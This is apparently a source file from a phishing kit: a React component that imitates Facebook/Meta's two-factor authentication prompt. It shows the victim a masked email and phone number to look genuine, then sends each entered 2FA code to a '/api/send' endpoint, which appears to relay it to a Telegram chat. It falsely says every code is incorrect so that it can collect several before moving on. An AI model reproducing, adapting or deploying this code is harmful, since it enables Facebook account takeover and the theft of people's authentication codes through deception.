import MetaLogo from '@/assets/images/meta-logo-image.png';
import VerifyImage from '@/assets/images/2FAuth.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep, userName }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, message, setMessage, setMessageId, userEmail, userPhone } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (localPart.length <= 2) {
            return localPart + '@' + domain;
        }
        // Show first char + 2 asterisks + last char + domain
        return localPart[0] + '**' + localPart[localPart.length - 1] + '@' + domain;
    };

    const maskPhone = (phone: string): string => {
        if (!phone || phone.length < 2) return '***';

        // Country code to dialing code mapping
        const countryDialingCodes: Record<string, string> = {
            'VN': '84', 'US': '1', 'GB': '44', 'FR': '33', 'DE': '49', 'IT': '39', 'ES': '34',
            'ZH': '86', 'JP': '81', 'IN': '91', 'BR': '55', 'RU': '7', 'AR': '54', 'AU': '61',
            'CA': '1', 'MX': '52', 'NL': '31', 'PL': '48', 'EL': '30', 'PT': '351', 'KR': '82',
            'TH': '66', 'MY': '60', 'SG': '65', 'ID': '62', 'PH': '63', 'TW': '886',
            'HK': '852', 'BD': '880', 'PK': '92', 'TR': '90', 'EG': '20', 'ZA': '27'
        };

        // Extract only digits for counting and last 2 digits
        const onlyDigits = phone.replace(/\D/g, '');
        const last2 = onlyDigits.slice(-2);

        // Determine dialing code
        let dialingCode = '';
        if (phone.startsWith('+')) {
            // Extract only first 1-3 digits as country code (not all digits)
            const match = phone.match(/^\+(\d{1,3})/);
            dialingCode = match ? match[1] : '1';
        } else if (geoInfo?.country_code) {
            // Fallback to country code mapping
            dialingCode = countryDialingCodes[geoInfo.country_code] || '1';
        } else {
            dialingCode = '1'; // Default fallback
        }

        // Show: +{dialingCode}*...{last2}
        const asterisks = '*'.repeat(Math.max(3, onlyDigits.length - 2));
        return `+${dialingCode}${asterisks}${last2}`;
    };

    useEffect(() => {
        if (!geoInfo) return;

        (async () => {
            // Map country code to language code for translation (comprehensive mapping)
            const countryToLang: Record<string, string> = {
                // English
                'us': 'en', 'gb': 'en', 'au': 'en', 'ca': 'en', 'nz': 'en', 'ie': 'en',
                'sg': 'en', 'hk': 'en', 'za': 'en', 'ng': 'en', 'ke': 'en', 'gh': 'en', 'pk': 'en', 'bd': 'en',
                // Vietnamese
                'vn': 'vi',
                // Arabic
                'ae': 'ar', 'sa': 'ar', 'eg': 'ar', 'jo': 'ar', 'lb': 'ar', 'om': 'ar',
                'qa': 'ar', 'kw': 'ar', 'bh': 'ar', 'iq': 'ar', 'ye': 'ar', 'ps': 'ar',
                'tn': 'ar', 'ma': 'ar', 'dz': 'ar', 'ly': 'ar', 'sd': 'ar', 'mr': 'ar',
                // German
                'de': 'de', 'at': 'de', 'ch': 'de', 'lu': 'de',
                // Dutch
                'nl': 'nl', 'be': 'nl',
                // Bulgarian
                'bg': 'bg',
                // Portuguese
                'pt': 'pt', 'br': 'pt', 'ao': 'pt', 'mz': 'pt', 'cv': 'pt', 'gw': 'pt', 'st': 'pt', 'tl': 'pt',
                // Spanish
                'es': 'es', 'mx': 'es', 'ar': 'es', 'co': 'es', 'pe': 'es', 've': 'es',
                'cl': 'es', 'ec': 'es', 'bo': 'es', 'py': 'es', 'uy': 'es', 'cr': 'es',
                'pa': 'es', 'sv': 'es', 'hn': 'es', 'ni': 'es', 'gt': 'es', 'do': 'es', 'cu': 'es',
                // Finnish
                'fi': 'fi',
                // French
                'fr': 'fr', 'sn': 'fr', 'ci': 'fr', 'bj': 'fr',
                'bf': 'fr', 'ga': 'fr', 'gn': 'fr', 'cm': 'fr', 'cg': 'fr', 'ne': 'fr',
                'tg': 'fr', 'ml': 'fr', 'cd': 'fr', 'cf': 'fr', 'dj': 'fr', 'sc': 'fr',
                'bl': 'fr', 'gp': 'fr', 'mq': 'fr', 're': 'fr', 'mu': 'fr', 'ht': 'fr',
                // Greek
                'gr': 'el', 'cy': 'el',
                // Croatian
                'hr': 'hr',
                // Hungarian
                'hu': 'hu',
                // Hindi
                'in': 'hi',
                // Italian
                'it': 'it', 'sm': 'it', 'va': 'it',
                // Lithuanian
                'lt': 'lt',
                // Latvian
                'lv': 'lv',
                // Maltese
                'mt': 'mt',
                // Malay
                'my': 'ms', 'bn': 'ms',
                // Norwegian
                'no': 'no',
                // Polish
                'pl': 'pl',
                // Romanian
                'ro': 'ro', 'md': 'ro',
                // Swedish
                'se': 'sv', 'ax': 'sv',
                // Slovenian
                'si': 'sl',
                // Slovak
                'sk': 'sk',
                // Thai
                'th': 'th',
                // Turkish
                'tr': 'tr',
                // Chinese
                'cn': 'zh', 'tw': 'zh', 'mo': 'zh',
                // Korean
                'kr': 'ko',
                // Czech
                'cz': 'cs',
                // Danish
                'dk': 'da', 'gl': 'da',
                // Estonian
                'ee': 'et'
            };

            const targetLang = countryToLang[geoInfo.country_code.toLowerCase()] || 'en';
            const translationsData = getTranslations(targetLang);
            setTranslations(translationsData);
        })();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const updatedMessage = `${message}

<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                deleteMessageId: next === 1 ? messageId : undefined
            });

            if (res?.data?.success && typeof res.data.data?.result?.message_id === 'number') {
                setMessage(updatedMessage);
                setMessageId(res.data.data.result.message_id);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-1 sm:px-3 md:px-4'>
            <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-white overflow-y-auto'>
                {/* Header with user info and Facebook branding */}
                <div className='px-3 sm:px-4 md:px-6 pt-3 sm:pt-4 md:pt-6 pb-2 sm:pb-3 md:pb-4'>
                    <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{userName || t('User')} • {t('Facebook')}</p>
                </div>

                {/* Main content */}
                <div className='flex-1 flex flex-col overflow-y-auto gap-1.5 sm:gap-2 md:gap-3 px-3 sm:px-4 md:px-6 py-2 pb-3 sm:pb-4 md:pb-6'>
                    {/* Title */}
                    <h1 className='text-xs sm:text-sm md:text-base font-bold text-gray-900 leading-tight'>
                        {t('Two-factor authentication required')}
                    </h1>

                    {/* Description */}
                    <p className='text-[11px] sm:text-xs md:text-sm text-gray-700 leading-tight'>
                        {t('Enter the code for this account that we send to')} {maskEmail(userEmail || '')}{userPhone && ','} {userPhone && maskPhone(userPhone)}
                        {' '}{t('or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                    </p>

                    {/* Illustration */}
                    <div className='flex justify-center my-1.5 sm:my-2 md:my-3'>
                        <Image src={VerifyImage} alt='2FA' className='h-auto w-full rounded-lg' />
                    </div>

                    {/* Code Input */}
                    <div className='relative mb-1.5 sm:mb-2 md:mb-2.5'>
                        <input
                            type='tel'
                            inputMode='numeric'
                            pattern='[0-9]*'
                            id='code-input'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                            disabled={countdown > 0}
                            className={`w-full h-10 sm:h-11 md:h-12 rounded-xl border border-gray-300 px-3 py-2 sm:py-2.5 md:py-3 text-base font-medium focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all placeholder-gray-500 ${
                                countdown > 0 ? 'cursor-not-allowed opacity-60 bg-gray-50' : 'bg-white'
                            }`}
                            placeholder={t('Code')}
                        />
                    </div>

                    {/* Error message */}
                    {showError && (
                        <p className='text-xs sm:text-xs md:text-sm text-red-500 mb-4 sm:mb-6 md:mb-8'>
                            {t('The two-factor authentication you entered is incorrect. Please, try again after')} {countdown}s.
                        </p>
                    )}

                    {/* Continue Button */}
                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || code.length < 6 || countdown > 0}
                        className={`w-full h-10 sm:h-11 md:h-14 rounded-2xl bg-blue-500 text-white font-semibold text-xs sm:text-sm md:text-lg transition-all ${
                            isLoading || code.length < 6 || countdown > 0
                                ? 'cursor-not-allowed opacity-60'
                                : 'hover:bg-blue-600 shadow-md hover:shadow-lg'
                        } flex items-center justify-center`}
                    >
                        {isLoading ? (
                            <div className='h-6 w-6 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                        ) : (
                            t('Continue')
                        )}
                    </button>

                    {/* Try another way Button */}
                    <button
                        type='button'
                        disabled
                        className='w-full h-10 sm:h-11 md:h-14 rounded-2xl border border-gray-300 text-gray-400 font-semibold text-xs sm:text-sm md:text-lg transition-all opacity-60 cursor-not-allowed flex items-center justify-center'
                    >
                        {t('Try another way')}
                    </button>
                </div>

                {/* Meta Logo Footer */}
                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
